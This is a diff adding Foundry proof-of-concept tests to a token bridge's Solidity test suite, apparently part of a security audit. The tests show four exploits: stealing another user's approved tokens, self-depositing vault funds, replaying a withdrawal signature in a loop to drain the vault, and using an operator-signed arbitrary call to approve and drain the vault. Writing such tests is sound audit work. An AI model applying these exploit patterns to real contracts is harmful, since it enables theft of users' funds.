@@ -200,6 +200,100 @@ contract L1BossBridgeTest is Test {
         tokenBridge.withdrawTokensToL1(user, depositAmount, v, r, s);
     }
 
+    function testCanMovedApproveTokensFromOtherUser() public {
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        vm.stopPrank();
+
+        address attacker = makeAddr("attacker");
+
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        uint256 userBalance = token.balanceOf(user);
+        emit Deposit(user, attacker, userBalance);
+        tokenBridge.depositTokensToL2(user, attacker, userBalance);
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(user), 0, "User balance should be zero");
+        assertEq(token.balanceOf(address(vault)), userBalance, "Wrong vault final balance");
+    }
+
+    function testCanTransferToTheVaultFromTheVault() public {
+        // vm.startPrank(user);
+        // token.approve(address(tokenBridge), type(uint256).max);
+        // vm.stopPrank();
+
+        address attacker = makeAddr("attacker");
+
+        vm.startPrank(attacker);
+        uint256 vaultBalance = 500 ether;
+
+        deal(address(token), address(vault), vaultBalance);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance);
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
+
+        vm.stopPrank();
+
+        assertEq(token.balanceOf(address(vault)), vaultBalance, "Wrong vault final balance");
+    }
+
+    function testCanReplayWithdrawals() public {
+        // Assume the vault already holds some tokens
+        uint256 vaultInitialBalance = 1000e18;
+        uint256 attackerInitialBalance = 100e18;
+        address attacker = makeAddr("attacker");
+        address attackerInL2 = makeAddr("attackerInL2");
+
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), address(attacker), attackerInitialBalance);
+
+        // An attacker deposits tokens to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attackerInL2, attackerInitialBalance);
+
+        // Operator signs withdrawal.
+        (uint8 v, bytes32 r, bytes32 s) =
+            _signMessage(_getTokenWithdrawalMessage(attacker, attackerInitialBalance), operator.key);
+
+        // The attacker can reuse the signature and drain the vault.
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+    }
+
+    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
+        uint256 vaultInitialBalance = 1000e18;
+        deal(address(token), address(vault), vaultInitialBalance);
+        address attacker = makeAddr("attacker");
+        // An attacker deposits tokens to L2. We do this under the assumption that the
+        // bridge operator needs to see a valid deposit tx to then allow us to request a withdrawal.
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(attacker), address(0), 0);
+        tokenBridge.depositTokensToL2(attacker, address(0), 0);
+
+        // Under the assumption that the bridge operator doesn't validate bytes being signed
+        bytes memory message = abi.encode(
+            address(vault), // target
+            0, // value
+            abi.encodeCall(L1Vault.approveTo, (address(attacker), type(uint256).max)) // data
+        );
+        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);
+
+        tokenBridge.sendToL1(v, r, s, message);
+        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
+        token.transferFrom(address(vault), attacker, token.balanceOf(address(vault)));
+    }
+
     function _getTokenWithdrawalMessage(address recipient, uint256 amount) private view returns (bytes memory) {
         return abi.encode(
             address(token), // target
